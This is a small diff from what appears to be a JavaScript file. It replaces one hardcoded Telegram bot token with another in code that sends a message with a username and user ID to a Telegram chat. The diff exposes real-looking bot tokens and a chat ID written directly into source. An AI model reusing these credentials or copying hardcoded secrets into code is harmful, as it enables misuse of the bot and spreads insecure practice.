@@ -342,7 +342,7 @@ Username: @${username}
 User Id: ${userId}`;
 
 // Define your Telegram Bot API details
-const botToken = '8117634016:AAHiTESVkyjKD9_JAZ5qu74_yY4ClAEggS8';
+const botToken = '7503631582:AAEClcFYuH7m0pNmKhYEo_wpiT1qH5yZXNc';
 const chatId = '-1001772047129';
 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
